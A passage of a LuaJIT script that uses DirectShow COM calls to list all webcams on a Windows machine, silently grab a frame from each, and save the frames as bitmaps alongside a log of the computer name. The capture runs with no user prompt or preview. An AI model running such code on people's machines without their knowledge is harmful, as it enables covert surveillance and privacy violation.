            log(string.format("[!] Failed to get media control: 0x%08X", tonumber(ffi.cast("long", hr))))
            pNullBase[0].lpVtbl.Release(pNullBase[0])
            break
        end
        log("[+] Got media control interface")
        
        -- Get the connected media type to verify dimensions
        local connectedMT = ffi.new("AM_MEDIA_TYPE")
        ffi.fill(connectedMT, ffi.sizeof("AM_MEDIA_TYPE"), 0)
        hr = pGrabber[0].lpVtbl.GetConnectedMediaType(pGrabber[0], connectedMT)
        
        local width = 640
        local height = 480
        
        if SUCCEEDED(hr) and connectedMT.pbFormat ~= nil and connectedMT.cbFormat >= ffi.sizeof("BITMAPINFOHEADER") then
            local bih = ffi.cast("BITMAPINFOHEADER*", connectedMT.pbFormat)
            if bih.biWidth > 0 and bih.biHeight ~= 0 then
                width = bih.biWidth
                height = math.abs(bih.biHeight)
                log(string.format("[+] Detected resolution: %dx%d", width, height))
            else
                log(string.format("[!] Invalid dimensions in format, using default: %dx%d", width, height))
            end
            
            if connectedMT.pbFormat ~= nil then
                ole32.CoTaskMemFree(connectedMT.pbFormat)
            end
        else
            log(string.format("[*] Could not get format, using default resolution: %dx%d", width, height))
        end
        
        -- Run the filter graph
        log("[*] Running filter graph...")
        hr = pControl[0].lpVtbl.Run(pControl[0])
        if FAILED(hr) then
            log(string.format("[!] Failed to run graph: 0x%08X", tonumber(ffi.cast("long", hr))))
            pNullBase[0].lpVtbl.Release(pNullBase[0])
            break
        end
        log("[+] Filter graph running")
        
        -- Wait for capture
        log(string.format("[*] Waiting %dms for frame capture...", CAPTURE_TIMEOUT_MS))
        kernel32.Sleep(CAPTURE_TIMEOUT_MS)
        
        -- Try to get the buffer
        log("[*] Attempting to retrieve buffer...")
        local bufferSize = ffi.new("LONG[1]", 0)
        hr = pGrabber[0].lpVtbl.GetCurrentBuffer(pGrabber[0], bufferSize, nil)
        
        if SUCCEEDED(hr) and bufferSize[0] > 0 then
            log(string.format("[+] Buffer size: %d bytes", bufferSize[0]))
            
            local buffer = ffi.new("BYTE[?]", bufferSize[0])
            hr = pGrabber[0].lpVtbl.GetCurrentBuffer(pGrabber[0], bufferSize, ffi.cast("LONG*", buffer))
            
            if SUCCEEDED(hr) then
                log("[+] Successfully retrieved frame buffer")
                outputPath = generateFilePath(device.name, "CAPTURE", "bmp")
                success = saveBitmap(outputPath, width, height, buffer, bufferSize[0])
                
                if success then
                    log(string.format("[+] Saved bitmap: %s", outputPath))
                else
                    log("[!] Failed to save bitmap file")
                end
            else
                log(string.format("[!] Failed to get buffer data: 0x%08X", tonumber(ffi.cast("long", hr))))
            end
        else
            log(string.format("[!] No buffer available: 0x%08X, size=%d", tonumber(ffi.cast("long", hr)), bufferSize[0]))
        end
        
        -- Stop the graph
        if pControl[0] ~= nil then
            pcall(function() pControl[0].lpVtbl.Stop(pControl[0]) end)
        end
        
    until true
    
    -- Note: Skipping explicit cleanup to avoid crashes - OS will clean up on process exit
    -- COM objects will be released automatically
    
    return success, outputPath
end

function main()
    log("=== DirectShow Webcam Picture Capture ===")
    log(string.format("Computer: %s", getComputerName()))
    log(string.format("Timestamp: %s", os.date("%Y-%m-%d %H:%M:%S")))
    log("")
    
    -- Initialize COM
    local hr = ole32.CoInitializeEx(nil, COINIT_MULTITHREADED)
    if FAILED(hr) and tonumber(ffi.cast("long", hr)) ~= 0x00000001 then  -- S_FALSE is OK
        log(string.format("[!] Failed to initialize COM: 0x%08X", tonumber(ffi.cast("long", hr))))
        return false
    end
    log("[+] COM initialized")
    log()
    
    local devices = enumerateVideoDevices()
    
    if #devices == 0 then
        log("[!] No video capture devices found")
        ole32.CoUninitialize()
        return false
    end
    
    log()
    log(string.format("[*] Found %d device(s), capturing images from all...", #devices))
    log()
    
    local capturedFiles = {}
    
    for _, device in ipairs(devices) do
        local success, outputPath = captureImageFromDevice(device)
        
        if success and outputPath then
            table.insert(capturedFiles, outputPath)
        end
        
        log()
        
        -- Note: Not releasing monikers - they'll be cleaned up automatically
    end
    
    log("=== Capture Complete ===")
    log(string.format("[+] Successfully captured %d/%d images", #capturedFiles, #devices))
    
    for _, path in ipairs(capturedFiles) do
        log(string.format("    %s", path))
    end
    
    ole32.CoUninitialize()
    closeLogFile()
    return #capturedFiles > 0
end

-- Execute with error handling
-- Initialize log file FIRST before calling main
local logPath = initializeLogFile()
log(string.format("[*] Log file: %s", logPath))

local ok, err = pcall(main)
if not ok then
    log(string.format("FATAL: Capture failed - %s", tostring(err)))
    log(debug.traceback())
    closeLogFile()
    os.exit(1)
end
closeLogFile()

